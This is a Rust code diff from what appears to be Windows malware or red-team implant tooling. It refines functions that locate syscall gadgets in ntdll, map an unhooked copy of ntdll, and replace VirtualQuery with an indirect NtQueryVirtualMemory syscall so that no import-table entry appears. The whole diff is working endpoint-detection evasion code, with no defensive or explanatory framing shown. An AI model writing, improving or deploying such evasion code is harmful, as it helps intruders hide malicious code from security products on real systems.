@@ -420,7 +420,9 @@ unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
     }
     let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
     let p_sections = (nt as *const _ as usize
-        + std::mem::size_of::<IMAGE_NT_HEADERS64>())
+        + 4  // Signature (DWORD)
+        + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
+        + nt.FileHeader.SizeOfOptionalHeader as usize)
         as *const IMAGE_SECTION_HEADER;
 
     for i in 0..nt.FileHeader.NumberOfSections {
@@ -545,7 +547,9 @@ fn map_clean_ntdll() -> Result<usize> {
         let nt_headers = (loaded_ntdll_base + (*dos_header).e_lfanew as usize)
             as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
         let p_sections = (nt_headers as usize
-            + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>())
+            + 4  // Signature (DWORD)
+            + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
+            + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize)
             as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
         for i in 0..(*nt_headers).FileHeader.NumberOfSections {
             let section = &*p_sections.add(i as usize);
@@ -1041,30 +1045,55 @@ fn resolve_ntcontinue_ssn() -> u32 {
 /// - Related syscall dispatch entry: do_syscall immediately below.
 #[cfg(windows)]
 unsafe fn gadget_is_valid(addr: usize, len: usize) -> bool {
-    use winapi::um::memoryapi::VirtualQuery;
-    use winapi::um::winnt::{MEMORY_BASIC_INFORMATION, MEM_COMMIT};
-
-    let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
-    let result = VirtualQuery(
-        addr as *const _,
-        &mut mbi,
-        std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
-    );
-    if result == 0 {
-        return false; // VirtualQuery failed - cannot verify
+    /// Minimal MEMORY_BASIC_INFORMATION matching the Windows kernel layout.
+    #[repr(C)]
+    #[derive(Default)]
+    struct MemoryBasicInfo {
+        base_address: usize,
+        allocation_base: usize,
+        allocation_protect: u32,
+        partition_id: u16,
+        region_size: usize,
+        state: u32,
+        protect: u32,
+        type_: u32,
     }
 
-    // Region must be committed
-    if mbi.State != MEM_COMMIT {
-        return false;
-    }
-
-    // Region must be executable (PAGE_EXECUTE_*, including execute-read variants)
+    const MEM_COMMIT: u32 = 0x1000;
     const PAGE_EXECUTE: u32 = 0x10;
     const PAGE_EXECUTE_READ: u32 = 0x20;
     const PAGE_EXECUTE_READWRITE: u32 = 0x40;
     const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
-    let prot = mbi.Protect;
+
+    // Use our own indirect syscall — no IAT entry for VirtualQuery
+    let target = match get_syscall_id("NtQueryVirtualMemory") {
+        Ok(t) => t,
+        Err(_) => return false, // Can't verify, assume invalid
+    };
+    let mut mbi = MemoryBasicInfo::default();
+    let status = do_syscall(
+        target.ssn,
+        target.gadget_addr,
+        &[
+            (-1isize) as u64,                                 // NtCurrentProcess
+            addr as u64,                                      // BaseAddress
+            0u64,                                             // MemoryInformationClass = MemoryBasicInformation
+            &mut mbi as *mut _ as u64,                        // Buffer
+            std::mem::size_of::<MemoryBasicInfo>() as u64,    // Length
+            0u64,                                             // ReturnLength (NULL)
+        ],
+    );
+    if status < 0 {
+        return false;
+    }
+
+    // Region must be committed
+    if mbi.state != MEM_COMMIT {
+        return false;
+    }
+
+    // Region must be executable (PAGE_EXECUTE_*, including execute-read variants)
+    let prot = mbi.protect;
     let is_exec = prot == PAGE_EXECUTE
         || prot == PAGE_EXECUTE_READ
         || prot == PAGE_EXECUTE_READWRITE
@@ -1074,7 +1103,7 @@ unsafe fn gadget_is_valid(addr: usize, len: usize) -> bool {
     }
 
     // The entire gadget must fit within this memory region
-    let region_end = mbi.BaseAddress as usize + mbi.RegionSize;
+    let region_end = mbi.base_address + mbi.region_size;
     if addr + len > region_end {
         return false;
     }
